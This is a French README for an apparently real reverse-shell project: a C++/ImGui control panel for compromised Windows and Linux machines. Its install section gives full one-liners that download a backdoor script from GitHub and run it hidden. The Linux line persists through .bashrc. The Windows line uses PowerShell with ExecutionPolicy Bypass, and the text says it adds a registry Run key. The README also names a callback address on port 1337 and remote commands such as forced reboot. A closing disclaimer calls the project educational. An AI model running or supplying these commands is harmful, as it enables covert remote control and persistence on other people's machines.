# PRUVOST-OMEGA Reverse Shell

**PRUVOST-OMEGA** est une interface de contrôle d’un reverse shell multiplateforme (Windows/Linux) avec interface graphique en **C++ / ImGui**. Elle permet de recevoir et interagir avec des machines compromises via une console distante (type terminal), le tout dans une interface fluide et interactive.

---

## 📦 Fonctionnalités

* 🔤 Interface ImGui / OpenGL moderne pour Windows.
* 🧠 Liste des machines connectées (IP, pseudo).
* 💻 Console distante interactive (type shell/cmd/PowerShell).
* 🔀 Exécution de commandes classiques à distance :

  * `start notepad.exe`
  * `shutdown /r /t 0`
  * `exit` (ferme la session shell)
* 🔒 Persistance sur les machines compromises (via bashrc ou registre Windows).
* 📡 Communication TCP sur le port `1337`.

---

## 🧪 Captures principales

* Interface avec liste des machines connectées
* Console à distance pour chaque machine sélectionnée
* Boutons pour actions rapides (reboot, notepad, fermeture)

---

## ⚙️ Structure du projet

```
PRUVOST-OMEGA-Reverse-Shell/
├── backdoor.sh              # Reverse shell Linux
├── backdoor.ps1             # Reverse shell Windows (avec persistance)
├── PRUVOST-OMEGA_CLIENTAPP/
│   ├── Menu.cpp             # Interface ImGui + gestion TCP
│   ├── Menu.h
│   └── ...                  # Fichiers CMake, ImGui, GLFW, etc.
```

---

## 🚀 Installation & Exécution

### 🎯 Cible Linux

**Installation manuelle :**

```bash
bash -c 'curl -s https://raw.githubusercontent.com/s-i-m-o-n-git/Reverse-Shell/refs/heads/main/backdoor.sh -o ~/.backdoor.sh && chmod +x ~/.backdoor.sh && grep -q ".backdoor.sh" ~/.bashrc || echo "bash ~/.backdoor.sh &" >> ~/.bashrc && bash ~/.backdoor.sh &' &
```

**Ce script :**

* Télécharge `backdoor.sh` depuis GitHub.
* Rend le script exécutable.
* L'ajoute à `.bashrc` pour une exécution automatique.
* L’exécute en arrière-plan.

### 🎯 Cible Windows

**Installation automatique :**

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/s-i-m-o-n-git/Reverse-Shell/refs/heads/main/backdoor.ps1 -OutFile $env:APPDATA\backdoor.ps1; Start-Process -WindowStyle Hidden powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File $env:APPDATA\backdoor.ps1'"
```

**Ce script :**

* Télécharge `backdoor.ps1` dans `%APPDATA%`.
* L’exécute immédiatement.
* Ajoute une clé au registre `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` pour relancer automatiquement au démarrage.

> ⚡ **N'oubliez pas de modifier l'adresse IP dans les scripts `backdoor.sh` et `backdoor.ps1` en fonction de l'adresse du serveur ImGui.**

---

## 🛠️ Compilation de l'application graphique (C++)

### Prérequis

* Visual Studio avec support du C++17
* GLFW
* ImGui
* OpenGL ≥ 3.0
* Ws2\_32.lib (WinSock)

### Compilation

* Ouvrir `PRUVOST-OMEGA.sln` avec Visual Studio
* Compiler en **Release x64**

---

## 📡 Communication

* Le client (`backdoor.ps1` / `backdoor.sh`) tente de se connecter à `192.168.1.18:1337`
* Le serveur ImGui écoute sur `INADDR_ANY:1337` et accepte plusieurs connexions, identifiées par IP

> ⚠️ **Changez l'adresse IP hardcodée dans les scripts clients avant d'utiliser l'application.**

---

## ⚠️ Avertissement légal

Ce projet est à but **éducatif uniquement**. Son utilisation sur des machines que vous ne possédez pas ou sans consentement explicite est **illégale** et **pénalement répréhensible**. L’auteur ne pourra être tenu responsable d’un usage abusif.

---

## 📖 Auteur

Projet par `s-i-m-o-n-git`
Interface par **ImGui + OpenGL**
